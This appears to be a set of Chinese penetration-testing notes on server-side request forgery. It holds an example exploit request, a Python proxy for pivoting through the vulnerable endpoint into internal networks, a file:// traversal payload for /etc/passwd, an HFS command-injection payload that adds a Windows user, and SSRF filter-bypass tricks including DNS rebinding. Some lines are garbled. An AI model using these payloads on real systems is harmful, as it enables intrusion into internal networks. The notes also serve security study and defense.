#### SSRF：服务器端请求伪造（Server-Side Request Forgery）



[![bGnS2R.jpg](https://s4.ax1x.com/2022/03/02/bGnS2R.jpg)](https://imgtu.com/i/bGnS2R)

​    SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF攻击的目标一般是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

​    SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器



#### 漏洞危害

> 1. 前期渗透时,利⽤⽬标ssrf扫描内⽹存活主机或端⼝
> 2. 如果站点是php的利⽤Gopher协议,去尝试攻击内⽹
> 3. 搭建代理 

#### 局限性

> 1. ⼤部分情况下都是GET型ssrf漏洞,仅能探测存活，扫描端⼝、内⽹域名探测,危害⼗分有限
> 2. https请求ssl证书⽆法正常解析

#### 分类

> ssrf的类型现在通常分为:
>
> 1. 可回显型
> 2. ⾮回显型 
>
> 在实战中,⾮回显型的ssrf⽤处属实不⼤,也就不详讲了 

#### 示例-1

[![bvnpVJ.png](https://s1.ax1x.com/2022/03/15/bvnpVJ.png)](https://imgtu.com/i/bvnpVJ)

[![bvneqe.png](https://s1.ax1x.com/2022/03/15/bvneqe.png)](https://imgtu.com/i/bvneqe)

[![bvnRo9.png](https://s1.ax1x.com/2022/03/15/bvnRo9.png)](https://imgtu.com/i/bvnRo9)

[![bvn4Rx.png](https://s1.ax1x.com/2022/03/15/bvn4Rx.png)](https://imgtu.com/i/bvn4Rx)

尝试进⾏内⽹域名扫描: 

~~~http
ssrf漏洞数据包:
POST /api/invokeHttp HTTP/1.1
Host: api.xxx.com
Content-Length: 134
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0 4389.9 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: 1
Connection: close
{"jsonParam":"","headers":[],"files":
[],"url":"http://info.xx.com/","requestType":"GET","body":"","ip":"","por
t":"80","forma t":"utf-8"}
~~~

~~~http
响应包:
HTTP/1.1 200 OK
Server: openresty
Date: Sun, 31 Jan 2021 15:57:57 GMT
Content-Type: application/json;charset=UTF-8
Content-Length: 244
Connection: close
Access-Control-Allow-Origin: http://poc-intest.xx.com
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE
Access-Control-Max-Age: 0
Access-Control-Allow-Headers: Authorization,Origin, No-Cache, XRequested-With, If- Modified-Since, Pragma, Last-Modified, Cache-Control,
Expires, Content-Type, X-E4M- With,userId,token
Access-Control-Allow-Credentials: true
XDomainRequestAllowed: 1
Expires: Sun, 31 Jan 2021 15:57:57 GMT
Cache-Control: max-age=0

{"code":1,"data":"Http Get| url:http://info.xx.com/ |
e:org.apache.http.conn.HttpHostConnectException: Connect to
info.xx.com:80 [info.xx.com/172.26.202.55, info.xx.com/172.26.202.48]
failed: "","message":"访问成功"}
~~~

其中data字段就是调⽤接⼝以后返回的响应包 

通过这个⼀点,我们就可以⾃⼰构造⼀下,写出⼀个基于python的代理出来代码如下: 

~~~python
# -*- coding: utf-8 -*-
import requests
import json
from flask import Flask, request, Response, make_response
from urllib.parse import urlparse
from os.path import splitext, basename
app = Flask(__name__)
def get_filetype(url):
    content_type = 'text/html'
    response_mimetype = {
        '.png': 'image/png',
        '.js': 'application/javascript',
        '.jpg': 'image/jpeg',
        '.gif': 'image/gif',
        '.jpeg': 'image/jpeg',
        '.ico': 'image/x-icon',
        '.css': 'text/css',
        '.svg': 'image/svg+xml',
   }
    disassembled = urlparse(url)
    filename, file_ext = splitext(basename(disassembled.path))
    content_type = response_mimetype.get(file_ext, 'text/html')
    return content_type
@app.before_request
def before_request():
    proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
    data = request.data or request.form or ''
    dest_url = 'http://api.xxx.com/api/invokeHttp'
    ssrfhd = {"header": "cookie",
              "value": "username.test=ext.bmw.test;"}
    ssrfhedlist = []
    filist = []
    ssrfhedlist.append(ssrfhd)
    dest_data = {
        'url':  request.url,
        'requestType': request.method.lower(),
        'files': filist,
        'body': data,
        'jsonParam': '',
        'headers': ssrfhedlist, 123456789
        'format': 'utf-8'
   }
    headers = dict()
    for name, value in request.headers:
        headers[name] = value
    headers['Cookie'] = 'key1=value1;key2=value2;'
    headers['Host'] = 'api.xxx.com'
    headers['Content-Type'] = 'application/json'
    resp = requests.post(url=dest_url, headers=headers,
                         json=dest_data, proxies=proxies)
    new_headers = {**resp.headers, 'Content-Type':
get_filetype(request.url)}
    if 'Content-Encoding' in new_headers.keys():
        del new_headers['Content-Encoding']
    if resp.status_code == "302":
        resp_content_modify_html = "302"
        return resp_content_modify_html, resp.status_code, new_headers
    resp_content_modify = json.loads(resp.content)
    resp_content_modify_html = resp_content_modify["data"].replace("/n",
"")
    return resp_content_modify_html, resp.status_code, new_headers
if __name__ == "__main__":
    app.run(port=8081, debug=True)
~~~













##### 有关SSRF的敏感函数

- `file_get_contents()`
- `fsockopen()`
- `curl_exec()`
- `[![bvn4Rx.png](https://s1.ax1x.com/2022/03/15/bvn4Rx.png)](https://imgtu.com/i/bvn4Rx)`
- `fopen()`
- `readfile()`

![](https://z3.ax1x.com/2021/09/26/4y4iIe.png)

![](https://z3.ax1x.com/2021/09/26/4y4foD.png)

tips

如果以file协议去访问 结合目录穿越漏洞 可以得到敏感信息

如：?url=file:///../../../../../../etc/password

HFS的RCE

```
找到的版本只有2.3m 此时已不存在该RCE所以仅写出payload当思路http://127.0.0.1:8080/?search==%00{.exec|cmd.exe /c [Command-String].} http://127.0.0.1:8080/?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.} 添加一个用户test1234
```

```
https://pan.baidu.com/s/1bp96ECJ    //CSRFTester https://www.t00ls.net/articles-41070.html   //SSRF漏洞文章
```

#### 防御

SSRF 统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态

1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等

2.黑名单内网 IP。

3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS.

#### 绕过

###### 利用[::]绕过localhost

http://[::]:80/ >>> http://127.0.0.1

###### 利用@

http://example.com@127.0.0.1

###### 利用短地址

http://dwz.cn/11SMa >>> http://127.0.0.1

###### 利用特殊域名

http://127.0.0.1.xip.io/

http://www.owasp.org.127.0.0.1.xip.io/

###### 利用DNS解析

在域名上设置A记录，指向127.0.1

###### 利用Enclosed alphanumerics

List:

~~~
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳

⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇

⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛

⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵

Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ <img class="emoji" draggable="false" alt="

" src="https://s.w.org/images/core/emoji/72x72/24c2.png"> Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ

ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ

⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴

⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

~~~

###### **利用句号**

127。0。0。1 >>> 127.0.0.1

###### **利用进制转换**

`可以是十六进制，八进制等。`

`115.239.210.26 >>> 16373751032`

###### **利用协议**

除了上图的协议之外，还可以与之前这几种组合起来

#### 传统SSRF过滤

传统SSRF过滤器的方式大致是以下几个步骤：

（1）    获取到输入的URL，从该URL中提取host

（2）    对该host进行DNS解析，获取到解析的IP

（3）    检测该IP是否是合法的，比如是否是私有IP等

（4）    如果IP检测为合法的，则进入curl的阶段发包

我们从DNS解析的角度看，该检测方式一共有两次，第一次是步骤2中对该host进行DNS解析，第二次是使用CURL发包的时候进行解析。这两次DNS解析是有时间差的，我们可以使用这个时间差进行绕过。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。

##### DNS Rebinding绕过

攻击者需要自己持有一个域名，然后将这个域名解析指向自己的DNS Server，在该server上写个解析服务，每次返回不同的解析结果

第一次请求DNS查询，结果返回的是101.191.60.117，是一个合法的公网IP，但是第二次请求时，变成了私有IP 10.36.5.215。注意到，这两条记录的ttl都是0，这是为了防止有DNS服务器对解析结果进行缓存

##### IP双重绑定绕过

一般PHP在获取IP的时候通常是使用gethostname或者dns_get_record这俩函数

如果使用的是gethostname来获取IP，则只会返回一个，返回哪个IP是随机的

但是Curl在访问这种域名的时候，由于绑定的是两个IP，curl会尝试访问每一个IP，最终返回有效的那个。比如我一个域名绑定了两个IP，一个是1.1.1.1（80端口关闭），一个是2.2.2.2（80端口开放），在curl这个域名的时候，会返回2.2.2.2的请求结果。

如果SSRF过滤逻辑使用的是gethostname或者只获取了dns_get_record返回数组的第一个元素，那么就会存在被绕过的风险。

##### 问题

问题一是DNS缓存的问题，即使我们在前面实现的时候设置了TTL为0，但是有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存，完全不按照标准协议来，遇到这种情况是无解的。但是8.8.8.8是严格按照DNS协议去管理缓存的，如果设置TTL为0，则不会进行缓存，从效果上来看，每次dig都会跑去我们的NS服务器上去查询一遍。

问题二是DNS迭代查询和递归查询的问题，往往这边发起攻击，DNS服务器会收到很多不同IP的查询请求，无法确定与受害服务器相关的来源IP是哪个。为此我一共实现了3版解析脚本，第一版很容易想到，首先对来源IP进行搜集，保存在文件中，然后真实发起请求的时候基于IP列表进行解析，但是后来发现还是很多莫名其妙的来源IP过来。但是仔细查看这些IP，发现都是某个B段或者C段的，很固定，因此第二版是基于IP段过滤，但是又有这种解析flag标志位交替不准确的问题。
